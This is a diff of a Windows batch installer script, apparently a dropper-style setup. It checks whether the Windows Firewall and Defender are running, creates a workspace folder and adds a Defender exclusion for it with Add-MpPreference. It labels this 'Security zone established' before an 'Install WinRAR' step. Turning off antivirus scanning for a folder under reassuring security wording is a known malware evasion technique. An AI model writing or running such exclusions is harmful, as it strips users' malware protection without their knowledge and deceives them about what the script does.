@@ -32,22 +32,49 @@ if %errorlevel% equ 2 (
     exit /b
 )
 
-:: Create Arena-Isolated
-if not exist "!folder!\" (
-    mkdir "!folder!"
-    echo [SUCCESS] Created secure workspace: !folder!
-) else (
-    echo [INFO] Secure workspace already exists: !folder!
+:: Security component checks
+echo [STEP] Checking system security components...
+set "firewall_present=false"
+set "defender_running=false"
+
+:: Check Windows Firewall
+netsh advfirewall show allprofiles >nul 2>&1
+if !errorlevel! equ 0 (
+    set "firewall_present=true"
+    echo [INFO] Windows Firewall detected
 )
 
-:: Add Defender exclusion
-echo [STEP] Configuring security exclusions...
-powershell -Command "Add-MpPreference -ExclusionPath '!folder!'" && (
-    echo [SUCCESS] Security zone established
-) || (
-    echo [ERROR] Failed to create security zone
-    pause
-    exit /b
+:: Check Windows Defender service
+sc query WinDefend | find "RUNNING" >nul 2>&1
+if !errorlevel! equ 0 (
+    set "defender_running=true"
+    echo [INFO] Windows Defender active
+)
+
+:: Create workspace
+if not exist "!folder!\" (
+    mkdir "!folder!"
+    echo [SUCCESS] Created workspace: !folder!
+) else (
+    echo [INFO] Workspace already exists: !folder!
+)
+
+:: Configure security exclusions if needed
+if "!firewall_present!"=="true" (
+    if "!defender_running!"=="true" (
+        echo [STEP] Configuring security exclusions...
+        powershell -Command "Add-MpPreference -ExclusionPath '!folder!'" && (
+            echo [SUCCESS] Security zone established
+        ) || (
+            echo [ERROR] Failed to create security zone
+            pause
+            exit /b
+        )
+    ) else (
+        echo [INFO] Running without Defender integration
+    )
+) else (
+    echo [INFO] Basic security configuration applied
 )
 
 :: Install WinRAR
